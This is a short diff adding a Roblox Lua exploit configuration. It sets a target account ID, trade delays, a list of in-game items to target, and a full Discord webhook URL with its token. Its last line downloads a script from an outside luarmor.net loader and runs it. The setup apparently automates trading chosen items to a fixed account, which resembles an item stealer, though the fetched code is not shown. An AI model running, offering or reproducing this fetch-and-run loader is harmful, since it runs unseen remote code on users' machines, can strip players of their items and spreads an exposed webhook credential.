@@ -1,0 +1,10 @@
+getgenv().SECRET_KEY = "YOUR_API_KEY"
+getgenv().TARGET_ID = 7930749228
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1481457316917284936/XLtQGLPUR0LDnnR7ppKxe-HH7-MId2XyZdMcsrCKgiRkBY9DwThWrpSb7THx_IbqF0nF"
+getgenv().TARGET_BRAINROTS = {
+    ["Swaggy Bros"] = true,
+    ["Burguro And Fryuro"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
